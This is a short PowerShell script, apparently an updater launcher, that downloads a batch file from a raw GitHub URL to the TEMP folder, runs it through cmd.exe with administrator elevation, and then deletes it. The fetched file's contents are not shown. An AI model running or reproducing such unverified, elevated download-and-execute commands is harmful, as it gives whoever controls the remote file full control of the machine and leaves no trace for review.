$p = Join-Path $env:TEMP 'cntdd_updateR.bat'
Invoke-WebRequest 'https://raw.githubusercontent.com/alexsandroprado/cntdd_updateR/refs/heads/main/cntdd_updateR.bat' -OutFile $p
Start-Process 'cmd.exe' -ArgumentList "/c `"$p`"" -Verb RunAs -Wait
Remove-Item $p
